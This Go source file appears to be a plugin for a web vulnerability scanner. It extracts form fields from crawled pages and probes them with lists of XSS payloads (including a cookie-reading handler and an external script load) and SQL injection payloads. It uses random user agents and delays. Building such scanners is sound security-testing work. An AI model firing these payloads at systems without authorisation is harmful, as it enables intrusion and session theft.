package core

import (
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
)

type InjectionTester struct{}

func (i *InjectionTester) Name() string {
	return "Injection Tester"
}

// Run performs XSS and SQLi tests for each visited link and returns a partial ScanResult
// that contains any discovered vulnerabilities.
func (i *InjectionTester) Run(target *TargetInfo) (ScanResult, error) {
	var wg sync.WaitGroup
	var vMu sync.Mutex

	var vulns []Vulnerability

	// Helper function to add a new vulnerability in a thread-safe manner.
	addVulnerability := func(v Vulnerability) {
		vMu.Lock()
		vulns = append(vulns, v)
		vMu.Unlock()
	}

	// For each link in VisitedLinks, run XSS and SQLi tests concurrently.
	for link := range VisitedLinks {
		wg.Add(2)

		go func(l string) {
			defer wg.Done()
			testForXSS(i, l, addVulnerability)
		}(link)

		go func(l string) {
			defer wg.Done()
			testForSQLInjection(i, l, addVulnerability)
		}(link)
	}

	wg.Wait()

	partialResult := ScanResult{
		Vulnerabilities: vulns,
	}
	return partialResult, nil
}

var xssPayloads = []string{
	"<script>alert(XSS)</script>",
	"<img src=x onerror=alert(XSS)>",
	"<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"\\>",
	"<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>",
	"\\<a onmouseover=\"alert(document.cookie)\"\\>xxs link\\</a\\>",
	"<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>",
	"<a href=\"jav&#x09;ascript:alert('XSS');\">Click Me</a>",
	"<<SCRIPT>alert(\"XSS\");//\\<</SCRIPT>",
	"</script><script>alert('XSS');</script>",
	"<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
	"<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">",
	"<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
	"<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
	"<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
	"<BASE HREF=\"javascript:alert('XSS');//\">",
}

var sqliPayloads = []string{
	"' OR '1'='1' -- ",
	"' OR 1=1 --",
	"' UNION SELECT null, version() --",
	"' AND sleep(5) --",
}

// ExtractFormParams returns the names of non-password input fields from forms on the target page.
func ExtractFormParams(target string) []string {
	var params []string

	resp, err := http.Get(target)
	if err != nil {
		fmt.Println("error", err)
		return params
	}
	defer resp.Body.Close()

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		fmt.Println("error", err)
		return params
	}

	doc.Find("form input").Each(func(i int, input *goquery.Selection) {
		name, exists := input.Attr("name")
		if exists && !strings.Contains(name, "password") {
			params = append(params, name)
		}
	})

	return params
}

// testForXSS checks each parameter for potential XSS vulnerabilities and reports them via addVulnerability.
func testForXSS(plugin Plugin, target string, addVulnerability func(Vulnerability)) {
	params := ExtractFormParams(target)
	if len(params) == 0 {
		return
	}

	var wg sync.WaitGroup
	for _, param := range params {
		if IsAlreadyTested(target, param) {
			continue
		}
		for _, payload := range xssPayloads {
			wg.Add(1)
			go func(param, payload string) {
				defer wg.Done()
				RandomDelay()

				client := &http.Client{}
				reqURL := target + "?" + param + "=" + url.QueryEscape(payload)
				req, _ := http.NewRequest("GET", reqURL, nil)
				req.Header.Set("User-Agent", GetRandomUserAgent())

				resp, err := client.Do(req)
				if err == nil && resp.StatusCode == 200 {
					body, _ := io.ReadAll(resp.Body)
					_ = resp.Body.Close()
					// Check if the payload appears in the response (basic check).
					if strings.Contains(string(body), payload) {
						fmt.Printf("⚠️ Possible XSS on %s (%s parameter)\n", reqURL, param)
						MarkAsTested(target, param)

						addVulnerability(Vulnerability{
							PluginName:  plugin.Name(),
							Title:       "Possible XSS",
							Severity:    "Medium",
							Description: "Reflected XSS payload was found in the response.",
							Evidence:    reqURL,
						})
					}
				}
			}(param, payload)
		}
	}
	wg.Wait()
}

// testForSQLInjection checks each parameter for potential SQL injection vulnerabilities and reports them.
func testForSQLInjection(plugin Plugin, target string, addVulnerability func(Vulnerability)) {
	params := ExtractFormParams(target)
	if len(params) == 0 {
		return
	}

	var wg sync.WaitGroup
	for _, param := range params {
		if IsAlreadyTested(target, param) {
			continue
		}
		for _, payload := range sqliPayloads {
			wg.Add(1)
			go func(param, payload string) {
				defer wg.Done()
				RandomDelay()

				client := &http.Client{}
				reqURL := target + "?" + param + "=" + url.QueryEscape(payload)
				req, _ := http.NewRequest("GET", reqURL, nil)
				req.Header.Set("User-Agent", GetRandomUserAgent())

				resp, err := client.Do(req)
				if err == nil && resp.StatusCode == 200 {
					body, _ := io.ReadAll(resp.Body)
					_ = resp.Body.Close()
					if strings.Contains(string(body), "SQL syntax") ||
						strings.Contains(string(body), "MySQL") ||
						strings.Contains(string(body), "PostgreSQL") ||
						strings.Contains(string(body), "syntax error") {
						fmt.Printf("⚠️ Possible SQL Injection on %s (%s parameter)\n", reqURL, param)
						MarkAsTested(target, param)

						addVulnerability(Vulnerability{
							PluginName:  plugin.Name(),
							Title:       "Possible SQL Injection",
							Severity:    "High",
							Description: "Detected SQL error messages in the response.",
							Evidence:    reqURL,
						})
					}
				}
			}(param, payload)
		}
	}
	wg.Wait()
}
